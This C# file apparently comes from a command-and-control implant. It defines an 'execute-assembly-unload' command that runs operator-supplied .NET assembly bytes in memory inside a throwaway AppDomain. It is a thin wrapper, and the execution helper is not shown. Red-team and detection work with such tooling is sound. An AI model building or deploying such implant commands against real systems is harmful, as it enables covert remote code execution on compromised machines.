using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
namespace Agent.Commands
{
    public class ExecuteAssemblyAndUnload : AgentCommand
    {
        public override string Name => "execute-assembly-unload";

        public override string Execute(AgentTask task)
        {
            if (task.FileBytes is null)
            {
                return "No file Provided";
            }
            return Internal.Execute.ExecuteAssemblyUnloadAppDomain(task.FileBytes, task.Args);
        }
    }
}
